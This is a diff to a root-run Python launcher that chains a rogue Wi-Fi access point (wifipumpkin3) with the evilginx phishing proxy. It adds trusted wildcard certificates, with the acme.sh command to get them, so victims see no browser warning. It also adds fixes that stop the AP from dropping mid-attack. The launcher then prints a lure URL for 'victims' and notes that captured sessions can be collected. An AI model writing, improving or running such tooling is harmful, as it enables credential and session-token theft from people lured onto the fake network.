@@ -38,6 +38,87 @@ HOSTS = "/etc/hosts"
 HOSTS_MARK = "# nethunter-phishkin3"
 AP_IP = "172.16.0.1"
 PROXY_PORT = 8080
+# World-readable index of domains that have a real cert installed. The GUI
+# runs as the login user and cannot read /root/, so the picker consults this
+# directory instead: one empty marker file per domain, mode 644 on a 755 dir.
+# Refreshed on every launcher run so it never drifts from the real cert store.
+CERTS_INDEX_DIR = "/var/lib/nethunter-phishkin3/certs"
+
+
+def has_real_cert(domain_puny):
+    """True if a real (Let's Encrypt/CA) cert for this domain is installed.
+
+    Evilginx loads external "unmanaged" certs from <config>/crt/sites/<host>/
+    when started WITHOUT -developer and with `config autocert off`. When such a
+    cert is present we prefer it: the browser trusts it (valid public CA), so
+    the login page and every asset subdomain (static.<domain>, etc.) load with
+    no certificate warning -- which the self-signed developer CA can never do,
+    because a browser will not accept an untrusted cert for JS-loaded
+    subresources even after the user clicks through the top-level warning.
+
+    Get a wildcard cert for a free domain (e.g. deSEC dedyn.io) with DNS-01 and
+    drop fullchain.pem + privkey.pem into crt/sites/<domain>/:
+        acme.sh --issue --dns dns_desec -d <domain> -d '*.<domain>' \
+            --dnssleep 300
+    Falls back to -developer (self-signed) when no such cert exists.
+    """
+    site = os.path.join(EV_CONFIG_DIR, "crt", "sites", domain_puny)
+    have_chain = (os.path.isfile(os.path.join(site, "fullchain.pem"))
+                  or any(f.endswith(".crt") for f in _listdir(site)))
+    have_key = (os.path.isfile(os.path.join(site, "privkey.pem"))
+                or any(f.endswith(".key") for f in _listdir(site)))
+    return have_chain and have_key
+
+
+def _listdir(path):
+    try:
+        return os.listdir(path)
+    except OSError:
+        return []
+
+
+def refresh_cert_index():
+    """Sync CERTS_INDEX_DIR with what is actually loadable from crt/sites/.
+
+    The GUI's phishkin3 picker lists the domains found here to bubble
+    real-cert domains to the top of the suggestions. Keeping the index in
+    sync on every launcher run means an admin who drops a new
+    fullchain.pem+privkey.pem under crt/sites/<domain>/ sees the entry appear
+    in the picker on the next Dry run or Launch. Empty marker files, mode
+    644 on a 755 dir; the private key stays in /root/ and is only ever read
+    by this launcher (which runs as root).
+    """
+    sites = os.path.join(EV_CONFIG_DIR, "crt", "sites")
+    try:
+        os.makedirs(CERTS_INDEX_DIR, mode=0o755, exist_ok=True)
+        os.chmod(CERTS_INDEX_DIR, 0o755)
+    except OSError:
+        return
+    have = set()
+    for name in _listdir(sites):
+        d = os.path.join(sites, name)
+        if not os.path.isdir(d):
+            continue
+        files = _listdir(d)
+        chain = ("fullchain.pem" in files
+                 or any(f.endswith(".crt") for f in files))
+        key = ("privkey.pem" in files
+               or any(f.endswith(".key") for f in files))
+        if chain and key:
+            have.add(name)
+    # add missing markers, drop stale ones
+    existing = set(_listdir(CERTS_INDEX_DIR))
+    for name in have - existing:
+        try:
+            open(os.path.join(CERTS_INDEX_DIR, name), "w").close()
+            os.chmod(os.path.join(CERTS_INDEX_DIR, name), 0o644)
+        except OSError:
+            pass
+    for name in existing - have:
+        try:
+            os.remove(os.path.join(CERTS_INDEX_DIR, name))
+        except OSError:
+            pass
 
 
 def say(m):
@@ -112,9 +193,18 @@ def run_evilginx_setup(phishlet, domain_puny, landing_sub):
             except OSError:
                 pass
     os.makedirs(EV_CONFIG_DIR, exist_ok=True)
-    cmds = "\n".join([
+    real_cert = has_real_cert(domain_puny)
+    cmds_list = [
         "config domain %s" % domain_puny,
         "config ipv4 %s" % AP_IP,
+    ]
+    if real_cert:
+        # A trusted cert is installed under crt/sites/<domain>/. Load it as an
+        # unmanaged cert instead of self-signing: `autocert off` makes evilginx
+        # read the cert from disk, and we must NOT pass -developer (which forces
+        # self-signed at the handshake and never touches the disk cert).
+        cmds_list.append("config autocert off")
+    cmds_list += [
         # Turn the blacklist off. In the phishkin3 setup every victim request
         # transits through the AP, so their apparent source IP for evilginx
         # sits inside the AP's own subnet; a stray probe or curl to the wrong
@@ -130,11 +220,16 @@ def run_evilginx_setup(phishlet, domain_puny, landing_sub):
         "lures get-url 0",
         "exit",
         "",
-    ])
-    say("configuring evilginx (domain %s, phishlet %s)" % (domain_puny, phishlet))
+    ]
+    cmds = "\n".join(cmds_list)
+    say("configuring evilginx (domain %s, phishlet %s, cert=%s)"
+        % (domain_puny, phishlet, "letsencrypt/unmanaged" if real_cert
+           else "developer/self-signed"))
+    ev_cmd = [EVILGINX, "-c", EV_CONFIG_DIR, "-p", PHISHLETS_DIR]
+    if not real_cert:
+        ev_cmd.append("-developer")
     p = subprocess.run(
-        [EVILGINX, "-c", EV_CONFIG_DIR, "-p", PHISHLETS_DIR, "-developer"],
-        input=cmds, capture_output=True, text=True, timeout=60)
+        ev_cmd, input=cmds, capture_output=True, text=True, timeout=60)
     # The lure URL is the last bare https:// line evilginx prints (get-url's
     # output). Matching on the domain is fragile when the domain has odd
     # characters, so take the last standalone URL line instead.
@@ -296,9 +391,24 @@ def release_from_networkmanager(interface):
     """
     subprocess.run(["nmcli", "device", "set", interface, "managed", "no"],
                    stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    # Realtek USB dongles (rtw_88xxau, e.g. the RTL8811AU/Archer T2U Nano) reset
+    # themselves in AP mode when WiFi power-save is on: dmesg shows the adapter
+    # entering/leaving promiscuous mode and then 'usb 1-1: reset high-speed USB
+    # device' / '(unregistering)', which tears wlan1 down and the AP silently
+    # dies mid-attack ('client has left AP', SSID gone). Force power-save off on
+    # the AP interface, and disable USB autosuspend so the kernel never parks the
+    # dongle. Done here (and re-applied after the AP is up in start_in_tmux)
+    # because wp3 re-creates the interface when it switches it to AP mode.
+    subprocess.run(["iw", "dev", interface, "set", "power_save", "off"],
+                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    subprocess.run(
+        ["sh", "-c",
+         "for f in /sys/bus/usb/devices/*/power/control; do echo on > \"$f\" "
+         "2>/dev/null; done"],
+        stderr=subprocess.DEVNULL)
 
 
-def start_in_tmux(interface):
+def start_in_tmux(interface, domain_puny):
     """wp3 first (creates the AP), then evilginx, each in a tmux window.
 
     tmux so both survive the launcher exiting and can be attached for logs:
@@ -320,9 +430,18 @@ def start_in_tmux(interface):
         "wifipumpkin3 -p %s" % PULP_PATH])
     say("started wp3 in tmux (window wp3)")
     time.sleep(8)  # let the AP come up before evilginx binds
+    # wp3 re-created the interface when it put it into AP mode, which resets
+    # power_save back to on -- re-apply the Realtek stability fix now that the
+    # AP is up, or the dongle resets a minute or two in and the AP dies.
+    subprocess.run(["iw", "dev", interface, "set", "power_save", "off"],
+                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+    # Match the cert mode chosen at setup: with a real cert, no -developer so
+    # evilginx serves the trusted unmanaged cert from disk; otherwise
+    # -developer for the self-signed CA.
+    ev_dev = "" if has_real_cert(domain_puny) else " -developer"
     subprocess.run([
         "tmux", "new-window", "-t", "phishkin3", "-n", "evilginx",
-        "%s -c %s -p %s -developer" % (EVILGINX, EV_CONFIG_DIR, PHISHLETS_DIR)])
+        "%s -c %s -p %s%s" % (EVILGINX, EV_CONFIG_DIR, PHISHLETS_DIR, ev_dev)])
     say("started evilginx in tmux (window evilginx)")
 
     # phishkin3 sets up its FORWARD chain -- allow DNS, allow traffic to the
@@ -361,6 +480,12 @@ def main():
     if os.geteuid() != 0:
         sys.exit("must run as root")
 
+    # Keep the world-readable cert index in sync with what evilginx will
+    # actually load. Cheap, idempotent, and lets the GUI (which runs as the
+    # login user) surface real-cert domains in the picker even though it
+    # cannot read the cert dir under /root/.
+    refresh_cert_index()
+
     phishlet_path = os.path.join(PHISHLETS_DIR, args.phishlet + ".yaml")
     if not os.path.isfile(phishlet_path):
         sys.exit("phishlet not found: %s" % phishlet_path)
@@ -394,7 +519,7 @@ def main():
     write_hosts(domain_puny, subs)
     write_pulp(args.interface, args.interface_net, args.ssid,
                domain_puny, subs, lure_url)
-    start_in_tmux(args.interface)
+    start_in_tmux(args.interface, domain_puny)
     say("")
     say("attack running. Send victims to: %s" % lure_url)
     say("captured sessions appear in the evilginx window (tmux attach -t phishkin3)")
